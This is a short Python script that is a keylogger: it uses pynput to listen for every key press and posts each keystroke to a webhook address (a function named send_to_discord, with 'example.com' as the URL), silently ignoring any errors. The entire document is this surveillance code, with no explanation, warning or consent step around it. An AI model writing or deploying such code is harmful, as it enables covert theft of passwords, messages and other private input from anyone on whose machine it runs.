import requests
from pynput import keyboard
import os

webhook_url = "example.com"

def send_to_discord(key):
    try:
        key_str = key.char if hasattr(key, 'char') else str(key)
        payload = {"content": f"Key pressed: `{key_str}`"}
        requests.post(webhook_url, json=payload, timeout=5)
    except Exception:
        pass

def start_logging():
    with keyboard.Listener(on_press=send_to_discord) as listener:
        listener.join()

start_logging()
